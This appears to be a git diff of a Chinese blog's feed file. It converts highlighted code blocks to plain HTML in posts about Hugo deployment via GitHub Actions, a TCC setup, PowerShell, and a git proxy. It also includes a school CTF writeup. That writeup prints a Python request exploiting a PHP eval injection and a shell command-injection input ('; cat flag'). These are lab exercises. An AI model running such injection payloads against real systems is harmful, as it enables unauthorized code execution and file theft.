-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#66d9ef">tags</span>:
+<pre><code class="language-yml">tags:
 - hello
 - world
 - etc
-</code></pre></div><p>即使只有一个 tag ，也要按此格式来写，否则会编译错误。</p>
+</code></pre>
+<p>即使只有一个 tag ，也要按此格式来写，否则会编译错误。</p>
 <p>此外还有 title 的值应被包裹在括号之中等。</p>
 <p>另外，hexo 中的 time 项可不用修改，Hugo 似乎已支持了此种格式。</p>
 <h2 id="版本控制与自动化">版本控制与自动化</h2>
@@ -851,14 +871,15 @@ Set-Alias -Name l -Value Get-ChildItem
 <h3 id="版本控制">版本控制</h3>
 <p>首先是对内容（markdown 文件）的版本控制。</p>
 <p>对 <code>hugo new site .</code> 生成出来的文件夹，使用 <code>git init</code> ，并添加以下的 <code>.gitignore</code> 信息：</p>
-<pre><code class="language-gitignore" data-lang="gitignore">/archetypes/
+<pre><code class="language-gitignore">/archetypes/
 /data/
 /layouts/
 /public/
 /resources/
 /static/
 /themes/
-</code></pre><p>这样的话，只有下面两项被加入了版本控制之中：</p>
+</code></pre>
+<p>这样的话，只有下面两项被加入了版本控制之中：</p>
 <ul>
 <li><code>content/</code>，这个是文章所在的文件夹</li>
 <li><code>config.toml</code>，这个是 hugo 的配置文件</li>
@@ -867,72 +888,73 @@ Set-Alias -Name l -Value Get-ChildItem
 <h3 id="自动化">自动化</h3>
 <p>Hugo 的无依赖特性、配置都写在根目录下的 config.toml 文件中的功能与 GitHub Actions 的出现，使得文章自动部署变得极为简单。毫不夸张的说，在最初的配置之后，我们可以专注于文章的内容，本地甚至不需要有 Hugo 的存在。</p>
 <p>下面是 GitHub Actions 的 workflow，详情请看注释。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#66d9ef">name</span>: blog
+<pre><code class="language-yml">name: blog
 
-<span style="color:#66d9ef">on</span>: [push]
+on: [push]
 
-<span style="color:#66d9ef">jobs</span>:
-  <span style="color:#66d9ef">build</span>:
-    <span style="color:#66d9ef">name</span>: Build
-    <span style="color:#66d9ef">runs-on</span>: ubuntu-latest
-    <span style="color:#66d9ef">steps</span>:
-      <span style="color:#75715e"># 使用预编译的 Hugo 二进制文件</span>
-      - <span style="color:#66d9ef">name</span>: Setup Hugo
-        <span style="color:#66d9ef">uses</span>: peaceiris/actions-hugo@v2<span style="color:#ae81ff">.2.2</span>
-        <span style="color:#66d9ef">with</span>:
-          <span style="color:#66d9ef">hugo-version</span>: <span style="color:#e6db74">&#34;latest&#34;</span>
-          <span style="color:#75715e"># 使用 Hugo-extended 版本</span>
-          <span style="color:#66d9ef">extended</span>: <span style="color:#66d9ef">true</span>
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    steps:
+      # 使用预编译的 Hugo 二进制文件
+      - name: Setup Hugo
+        uses: peaceiris/actions-hugo@v2.2.2
+        with:
+          hugo-version: &quot;latest&quot;
+          # 使用 Hugo-extended 版本
+          extended: true
 
-      <span style="color:#75715e"># 新建站点</span>
-      - <span style="color:#66d9ef">name</span>: new site
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          hugo new site $HOME/blog</span>
+      # 新建站点
+      - name: new site
+        run: |
+          hugo new site $HOME/blog
 
-      <span style="color:#75715e"># 获取主题</span>
-      - <span style="color:#66d9ef">name</span>: get theme
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          git clone --depth=1 https://github.com/batkiz/left.git $HOME/blog/themes/left</span>
+      # 获取主题
+      - name: get theme
+        run: |
+          git clone --depth=1 https://github.com/batkiz/left.git $HOME/blog/themes/left
 
-      <span style="color:#75715e"># 获取 username.github.io 以保持 commit 记录</span>
-      - <span style="color:#66d9ef">name</span>: get username.github.io
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          git clone --no-checkout https://github.com/batkiz/batkiz.github.io.git $HOME/blog/public</span>
+      # 获取 username.github.io 以保持 commit 记录
+      - name: get username.github.io
+        run: |
+          git clone --no-checkout https://github.com/batkiz/batkiz.github.io.git $HOME/blog/public
 
-      <span style="color:#75715e"># 获取内容文件</span>
-      - <span style="color:#66d9ef">uses</span>: actions/checkout@v1
-        <span style="color:#66d9ef">with</span>:
-          <span style="color:#66d9ef">fetch-depth</span>: <span style="color:#ae81ff">1</span>
+      # 获取内容文件
+      - uses: actions/checkout@v1
+        with:
+          fetch-depth: 1
 
-      <span style="color:#75715e"># 将内容文件复制进入站点内</span>
-      - <span style="color:#66d9ef">name</span>: copy in
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          rm -rf $HOME/blog/config.toml $HOME/blog/content/</span>
+      # 将内容文件复制进入站点内
+      - name: copy in
+        run: |
+          rm -rf $HOME/blog/config.toml $HOME/blog/content/
           /bin/cp -rf config.toml $HOME/blog/config.toml
           /bin/cp -rf content/ $HOME/blog/content/
 
-      <span style="color:#75715e"># build</span>
-      - <span style="color:#66d9ef">name</span>: build
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          cd $HOME/blog</span>
+      # build
+      - name: build
+        run: |
+          cd $HOME/blog
           HUGO_ENV=production hugo --gc --minify
 
-      <span style="color:#75715e"># 将生成出的站点推向 username.github.io</span>
-      - <span style="color:#66d9ef">name</span>: publish
-        <span style="color:#66d9ef">env</span>:
-          <span style="color:#66d9ef">USER</span>: batkiz
-          <span style="color:#66d9ef">EMAIL</span>: batkiz@outlook.com
-          <span style="color:#66d9ef">GH_REF</span>: github.com/batkiz/batkiz.github.io.git
-          <span style="color:#75715e"># 这里的 token 需要自己在 GitHub settings 中部署，并利用 actions 的 secrets 功能</span>
-          <span style="color:#66d9ef">GH_TOKEN</span>: ${{ secrets.GH_TOKEN }}
-        <span style="color:#66d9ef">run</span>: <span style="color:#e6db74">|
-</span><span style="color:#e6db74">          cd $HOME/blog/public</span>
+      # 将生成出的站点推向 username.github.io
+      - name: publish
+        env:
+          USER: batkiz
+          EMAIL: batkiz@outlook.com
+          GH_REF: github.com/batkiz/batkiz.github.io.git
+          # 这里的 token 需要自己在 GitHub settings 中部署，并利用 actions 的 secrets 功能
+          GH_TOKEN: ${{ secrets.GH_TOKEN }}
+        run: |
+          cd $HOME/blog/public
           git config --global user.name $USER
           git config --global user.email $EMAIL
           git add .
-          git commit -m <span style="color:#e6db74">&#34;Auto Update: `date +&#39;%Y-%m-%d %H:%M:%S&#39;`&#34;</span>
-          git push <span style="color:#e6db74">&#34;https://$USER:$GH_TOKEN@$GH_REF&#34;</span> master:master
-</code></pre></div><p>感谢 <a href="https://github.com/peaceiris/actions-hugo">https://github.com/peaceiris/actions-hugo</a> 提供的可在 GitHub actions 使用的 Hugo 二进制文件，避免了每次都手动编译 Hugo。</p>
+          git commit -m &quot;Auto Update: `date +'%Y-%m-%d %H:%M:%S'`&quot;
+          git push &quot;https://$USER:$GH_TOKEN@$GH_REF&quot; master:master
+</code></pre>
+<p>感谢 <a href="https://github.com/peaceiris/actions-hugo">https://github.com/peaceiris/actions-hugo</a> 提供的可在 GitHub actions 使用的 Hugo 二进制文件，避免了每次都手动编译 Hugo。</p>
 <p>另外希望大家别不看内容就随便写，会出 typo 的，然后 failed（泪</p>
 <h2 id="结语">结语</h2>
 <p>经过一个下午 + 一个晚上的努力，终于成功地把博客迁移到了 Hugo，并实现了内容的版本管理与自动化部署。可喜可贺，可喜可贺。</p>
@@ -971,18 +993,20 @@ Set-Alias -Name l -Value Get-ChildItem
 <h2 id="使用">使用</h2>
 <p>于任意路径新建 <code>tmp</code> 文件夹，使用 VS Code 打开。</p>
 <p>新建 <code>hello.c</code> 文件，并写入下列内容</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>)
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(void)
 {
-    printf(<span style="color:#e6db74">&#34;Hello World.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-    printf(<span style="color:#e6db74">&#34;你好世界。&#34;</span>);
-    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    printf(&quot;Hello World.\n&quot;);
+    printf(&quot;你好世界。&quot;);
+    return 0;
 }
-</code></pre></div><p>保存后按下 <code>F1</code> 键，输入 <code>tcc</code>，找到 <code>TCC: Run</code> 项，回车，可看到下面的 terminal 被唤起，并输出下列信息</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Hello World.
+</code></pre>
+<p>保存后按下 <code>F1</code> 键，输入 <code>tcc</code>，找到 <code>TCC: Run</code> 项，回车，可看到下面的 terminal 被唤起，并输出下列信息</p>
+<pre><code class="language-text">Hello World.
 你好世界。
-</code></pre></div><p>如此，基本的开发环境便配置完成，enjoy!</p>
+</code></pre>
+<p>如此，基本的开发环境便配置完成，enjoy!</p>
 <h2 id="疑难解答">疑难解答</h2>
 <ul>
 <li>
@@ -1002,20 +1026,24 @@ Set-Alias -Name l -Value Get-ChildItem
 <li><a href="scoop.sh">scoop</a></li>
 </ul>
 <h2 id="installation">installation</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">Install-Module</span> <span style="color:#a6e22e">posh-git</span> <span style="color:#a6e22e">-Scope</span> <span style="color:#a6e22e">CurrentUser</span>
-<span style="color:#a6e22e">Install-Module</span> <span style="color:#a6e22e">oh-my-posh</span> <span style="color:#a6e22e">-Scope</span> <span style="color:#a6e22e">CurrentUser</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">scoop-completion</span>
-</code></pre></div><p>亦可均由 scoop 安装，即</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">scoop-completion</span>
-<span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">oh-my-posh</span>
-<span style="color:#a6e22e">scoop</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">posh-git</span>
-</code></pre></div><h2 id="配置">配置</h2>
+<pre><code class="language-ps">Install-Module posh-git -Scope CurrentUser
+Install-Module oh-my-posh -Scope CurrentUser
+</code></pre>
+<pre><code class="language-ps">scoop install scoop-completion
+</code></pre>
+<p>亦可均由 scoop 安装，即</p>
+<pre><code class="language-ps">scoop install scoop-completion
+scoop install oh-my-posh
+scoop install posh-git
+</code></pre>
+<h2 id="配置">配置</h2>
 <p>配置文件为 <code>~\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code>，若不存在请自行创建。</p>
 <p>写入下列内容并保存：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ps" data-lang="ps"><span style="color:#a6e22e">Import-Module</span> <span style="color:#a6e22e">posh-git</span>
-<span style="color:#a6e22e">Import-Module</span> <span style="color:#a6e22e">oh-my-posh</span>
-<span style="color:#a6e22e">Set-Theme</span> <span style="color:#a6e22e">PowerLine</span>
-</code></pre></div><h2 id="more-things">more things</h2>
+<pre><code class="language-ps">Import-Module posh-git
+Import-Module oh-my-posh
+Set-Theme PowerLine
+</code></pre>
+<h2 id="more-things">more things</h2>
 <ul>
 <li>我的 profile 文件与自己写的主题 <a href="https://github.com/batkiz/dotfiles/tree/master/powershell">dotfiles/powershell</a></li>
 <li>最好用 Windows Terminal 作为终端</li>
@@ -1049,13 +1077,14 @@ Set-Alias -Name l -Value Get-ChildItem
 <li><input disabled="" type="checkbox"> 无任何命令行参数附加打开时搞出一个交互式的命令行</li>
 </ul>
 <p>慢慢摸咯，想起来时再写 23333</p>
-]]></content></item><item><title>为 Git 配置代理</title><link>https://blog.batkiz.com/posts/2019/git-behind-proxy/</link><pubDate>Sun, 26 May 2019 16:39:16 +0000</pubDate><guid>https://blog.batkiz.com/posts/2019/git-behind-proxy/</guid><description>加速境外 git 服务托管网站速度。 操作 首先确保本地已开启 ss 或 ssr。 而后命令行执行如下命令。 git config --global http.proxy &amp;#39;http://127.0.0.1:1080&amp;#39; git config --global https.proxy &amp;#39;http://127.0.0.1:1080&amp;#39; 原理 在大多数 git 代理相关文章中，均配</description><content type="html"><![CDATA[<p>加速境外 git 服务托管网站速度。</p>
+]]></content></item><item><title>为 Git 配置代理</title><link>https://blog.batkiz.com/posts/2019/git-behind-proxy/</link><pubDate>Sun, 26 May 2019 16:39:16 +0000</pubDate><guid>https://blog.batkiz.com/posts/2019/git-behind-proxy/</guid><description>加速境外 git 服务托管网站速度。 操作 首先确保本地已开启 ss 或 ssr。 而后命令行执行如下命令。 git config --global http.proxy 'http://127.0.0.1:1080' git config --global https.proxy 'http://127.0.0.1:1080' 原理 在大多数 git 代理相关文章中，均配</description><content type="html"><![CDATA[<p>加速境外 git 服务托管网站速度。</p>
 <h2 id="操作">操作</h2>
 <p>首先确保本地已开启 ss 或 ssr。
 而后命令行执行如下命令。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git config --global http.proxy <span style="color:#e6db74">&#39;http://127.0.0.1:1080&#39;</span>
-git config --global https.proxy <span style="color:#e6db74">&#39;http://127.0.0.1:1080&#39;</span>
-</code></pre></div><h2 id="原理">原理</h2>
+<pre><code class="language-bash">git config --global http.proxy 'http://127.0.0.1:1080'
+git config --global https.proxy 'http://127.0.0.1:1080'
+</code></pre>
+<h2 id="原理">原理</h2>
 <p>在大多数 git 代理相关文章中，均配置的是 <code>socks5://127.0.0.1:1080</code> 进行代理。这样虽然速度确实增加了，但由于  协议并不支持 socks5 协议，每次 git push 操作时还需要手动输入账户密码，不能通过 ssh key 来登录，非常影响体验。</p>
 <p>ss/ssr 使用的是 socks5 协议，为使 http 协议也经过代理，均自带了privoxy 将 socks5 协议 转换为 http 协议。因此我们可以直接设置为 <code>http://127.0.0.1:1080</code>，问题得以解决。</p>
 <hr>
@@ -1087,22 +1116,23 @@ git config --global https.proxy <span style="color:#e6db74">&#39;http://127.0.0.
 <p>刚开始我试着仅仅浏览 Twitter 上的时间线并复制文本。但显然，当一个讨论贴达到了一定规模时，Twitter 限制了你能看到的推文数。所以从数据集中我仅能得到 285 个回复。</p>
 <p>接下来是使用 Twitter 开发者 API，虽然被限制严重，但允许更多的搜索粒度。</p>
 <p>通过 Python 和 Tweepy 及请求间的 5 分钟睡眠，我能够从请求中得到 763 条直接回复于我的推文。这花了 <strong>362 分钟</strong>，或言 <strong>6 个小时</strong>。更短的睡眠时间可能也行，但我睡后留下它自己跑，所以也没多大关系。</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> page <span style="color:#f92672">in</span> tweepy<span style="color:#f92672">.</span>Cursor(api<span style="color:#f92672">.</span>search, q<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;to:olafurw&#34;</span>, since_id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1087438169585434624&#39;</span>, tweet_mode<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;extended&#39;</span>)<span style="color:#f92672">.</span>pages():
-  repliesFile <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;replies.txt&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>)
+<pre><code class="language-python">for page in tweepy.Cursor(api.search, q=&quot;to:olafurw&quot;, since_id='1087438169585434624', tweet_mode='extended').pages():
+  repliesFile = open(&quot;replies.txt&quot;, &quot;a&quot;)
 
-  <span style="color:#66d9ef">for</span> tweet <span style="color:#f92672">in</span> page:
-    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>in_reply_to_status_id_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>user<span style="color:#f92672">.</span>screen_name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>id_str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-    repliesFile<span style="color:#f92672">.</span>write(tweet<span style="color:#f92672">.</span>full_text<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+  for tweet in page:
+    repliesFile.write(tweet.in_reply_to_status_id_str + &quot;\n&quot;)
+    repliesFile.write(tweet.user.screen_name + &quot;\n&quot;)
+    repliesFile.write(tweet.id_str + &quot;\n&quot;)
+    repliesFile.write(tweet.full_text.encode(&quot;utf-8&quot;) + &quot;\n&quot;)
 
-    repliesFile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">--==--</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+    repliesFile.write(&quot;\n--==--\n&quot;)
 
-  repliesFile<span style="color:#f92672">.</span>flush()
-  repliesFile<span style="color:#f92672">.</span>close()
+  repliesFile.flush()
+  repliesFile.close()
 
-  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">300</span>)
-</code></pre></div><h2 id="基本的分析">基本的分析</h2>
+  time.sleep(300)
+</code></pre>
+<h2 id="基本的分析">基本的分析</h2>
 <p>分析一个文本语料库是在教育领域之中的，且我对此了解不多，也没有时间来深入了解。但我想要强调一些尤为突出的事情。</p>
 <h3 id="编程是一个人类的领域">编程是一个人类的领域</h3>
 <p>763 条推文中有 131 条在谈到其他人。<strong>17.1%</strong></p>
@@ -1224,56 +1254,61 @@ git config --global https.proxy <span style="color:#e6db74">&#39;http://127.0.0.
 <p><a href="https://twitter.com/ericniebler/status/1087447876286869504">@ericniebler</a>
 保持谦虚，保持好奇。</p>
 </blockquote>
-]]></content></item><item><title>xatuctf2019 校赛 writeup</title><link>https://blog.batkiz.com/posts/2019/xatuctf2019-wp/</link><pubDate>Fri, 19 Apr 2019 21:57:00 +0000</pubDate><guid>https://blog.batkiz.com/posts/2019/xatuctf2019-wp/</guid><description>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水23333 WEB 你能读到flag吗 题目： &amp;lt;?php error_reporting(0); show_source(__FILE__); $a = @$_REQUEST[&amp;#39;hello&amp;#39;]; eval(&amp;#34;var_dump($a);&amp;#34;);?&amp;gt; 谷歌之，原题，直接复制提交。 使用 file_get_contents() 方法获得 flag</description><content type="html"><![CDATA[<p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水23333</p>
+]]></content></item><item><title>xatuctf2019 校赛 writeup</title><link>https://blog.batkiz.com/posts/2019/xatuctf2019-wp/</link><pubDate>Fri, 19 Apr 2019 21:57:00 +0000</pubDate><guid>https://blog.batkiz.com/posts/2019/xatuctf2019-wp/</guid><description>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水23333 WEB 你能读到flag吗 题目： &amp;lt;?php error_reporting(0); show_source(__FILE__); $a = @$_REQUEST['hello']; eval(&amp;quot;var_dump($a);&amp;quot;);?&amp;gt; 谷歌之，原题，直接复制提交。 使用 file_get_contents() 方法获得 flag</description><content type="html"><![CDATA[<p>2019.4.14 校赛，由于之前没办萌新赛，所以这次的题有点水23333</p>
 <h2 id="web">WEB</h2>
 <h3 id="你能读到flag吗">你能读到flag吗</h3>
 <p>题目：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"> <span style="color:#75715e">&lt;?php</span>
-<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
-<span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
+<pre><code class="language-php"> &lt;?php
+error_reporting(0);
+show_source(__FILE__);
 
-$a <span style="color:#f92672">=</span> <span style="color:#f92672">@</span>$_REQUEST[<span style="color:#e6db74">&#39;hello&#39;</span>];
-<span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;var_dump(</span><span style="color:#e6db74">$a</span><span style="color:#e6db74">);&#34;</span>);<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p><del>谷歌之，原题，直接复制提交。</del></p>
+$a = @$_REQUEST['hello'];
+eval(&quot;var_dump($a);&quot;);?&gt;
+</code></pre>
+<p><del>谷歌之，原题，直接复制提交。</del></p>
 <p>使用 <code>file_get_contents()</code> 方法获得 flag</p>
 <p>python 代码如下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<pre><code class="language-python">import requests
 
-s<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>session()
-body <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;hello&#34;</span>:<span style="color:#e6db74">&#34;file_get_contents(&#39;flag.php&#39;)&#34;</span>}
-r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#34;http://192.168.1.5:23114/read.php&#34;</span>, data<span style="color:#f92672">=</span>body)
+s=requests.session()
+body = {&quot;hello&quot;:&quot;file_get_contents('flag.php')&quot;}
+r = s.post(&quot;http://192.168.1.5:23114/read.php&quot;, data=body)
 
-<span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>content)
-</code></pre></div><h3 id="phpdecode">phpdecode</h3>
+print(r.content)
+</code></pre>
+<h3 id="phpdecode">phpdecode</h3>
 <p><del>直接搜 <code>1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=</code> 找到了别人的 wp，flag 获得。</del></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= <span style="color:#75715e">&lt;?php</span>
+<pre><code class="language-php">1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY= &lt;?php
 
-<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
-<span style="color:#66d9ef">require</span> <span style="color:#66d9ef">__DIR__</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/lib.php&#39;</span>;
+error_reporting(0);
+require __DIR__.'/lib.php';
 
-<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">hex2bin</span>(<span style="color:#a6e22e">strrev</span>(<span style="color:#a6e22e">bin2hex</span>($flag)))), <span style="color:#e6db74">&#39;&lt;hr&gt;&#39;</span>;
+echo base64_encode(hex2bin(strrev(bin2hex($flag)))), '&lt;hr&gt;';
 
-<span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);<span style="color:#75715e">?&gt;</span>
-</code></pre></div><p>可知加密为 <code>base64_encode(hex2bin(strrev(bin2hex($flag))))</code>，一层一层解密，python 脚本如下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode
-<span style="color:#f92672">from</span> binascii <span style="color:#f92672">import</span> hexlify, unhexlify
+highlight_file(__FILE__);?&gt;
+</code></pre>
+<p>可知加密为 <code>base64_encode(hex2bin(strrev(bin2hex($flag))))</code>，一层一层解密，python 脚本如下</p>
+<pre><code class="language-python">from base64 import b64decode
+from binascii import hexlify, unhexlify
 
-code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&#34;</span>
+code = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;
 
-<span style="color:#66d9ef">print</span>(unhexlify(hexlify(b64decode(code))[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
-</code></pre></div><h2 id="pwn">PWN</h2>
+print(unhexlify(hexlify(b64decode(code))[::-1]))
+</code></pre>
+<h2 id="pwn">PWN</h2>
 <h3 id="nc-from-0-to-1">nc from 0 to 1</h3>
 <p>直接 nc 连接即可获得 flag</p>
 <h3 id="ls1">ls1</h3>
 <p>ls as a service，将输入的字符传递为 ls 的 args，多试几次即可得出文件目录结构，精简后的如下：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">.
+<pre><code class="language-bash">.
 ├── bin
 │   ├── cat
 │   ├── ls
 │   └── sh
 ├── flag
 └── ls1
-</code></pre></div><p>传入 <code>; cat flag</code> 即可读到
+</code></pre>
+<p>传入 <code>; cat flag</code> 即可读到
 <img src="https://s2.ax1x.com/2019/04/19/E92wlT.png" alt="ls1"></p>
 <h3 id="ls2">ls2</h3>
 <p>ls as a service v2，限制了传入 args 的字符数为 3，无法直接 <code>cat flag</code>。
@@ -1287,9 +1322,10 @@ code <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1wMDE
 <p><code>kqfl{Hfjxfw_hnumjw_1x_xt_xnruqj}</code></p>
 <p>凯撒加密</p>
 <h3 id="rc4">rc4</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E=
+<pre><code class="language-txt">cipher:wRTwnbjEAf6T22dYzyKgtBzQ/ydMmNqmf3WeW9E=
 key:eGF0dXNlYw==
-</code></pre></div><p><a href="http://ctf.ssleye.com/rc4.html">rc4 加密</a>，唯一需要注意的是 key 可能需要经过一次 base64 解密。</p>
+</code></pre>
+<p><a href="http://ctf.ssleye.com/rc4.html">rc4 加密</a>，唯一需要注意的是 key 可能需要经过一次 base64 解密。</p>
 <h3 id="datababy">Datababy</h3>
 <p>数码宝贝中的字母表，对照即可。</p>
 <p>（由此题可以知道出题人没再手动复现题，因为 datababy 并不能搜到数码宝贝。其官方英文名称为 <em>Digital monster</em> 。</p>
@@ -1301,98 +1337,103 @@ ZERO -&gt; 0
 得到一长长长长长长长长长长长长长长长长长长长长长串 0 和 1。</p>
 <p>每八位二进制转 ASCII 即可获得 flag。</p>
 <h3 id="easy-rsa">easy RSA</h3>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129
+<pre><code class="language-txt">n = 9637828843823500407917687664441327784714605952794831018467094508166140790258515855681653788687192363262499178812675284846293988948568322307302995971433129
 e = 65537
 c = 1736476276571471518318904802453151397043836796931780608028216447791913603812271065838523639504410549594365173220377575243217983329182149750696526310732151
-</code></pre></div><p><a href="https://github.com/3summer/CTF-RSA-tool">https://github.com/3summer/CTF-RSA-tool</a></p>
+</code></pre>
+<p><a href="https://github.com/3summer/CTF-RSA-tool">https://github.com/3summer/CTF-RSA-tool</a></p>
 <h2 id="misc">MISC</h2>
 <h3 id="这个容易就是有点累">这个容易，就是有点累</h3>
 <p>一个压缩了几千层的 zip 包，可以直接上十六进制查看器(winhex, hxd, 010 editor等)打开，Ctrl + F flag 即可得到。</p>
 <p>据写脚本解压的小伙伴称他们跑了一个多小时（</p>
 <p>压缩脚本如下</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
-</span><span style="color:#75715e"></span>
-name1<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>cat /dev/urandom | sed <span style="color:#e6db74">&#39;s/[^a-zA-Z0-9]//g&#39;</span> | strings -n <span style="color:#ae81ff">6</span> | head -n 1<span style="color:#e6db74">`</span>
-name2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;.zip&#34;</span>
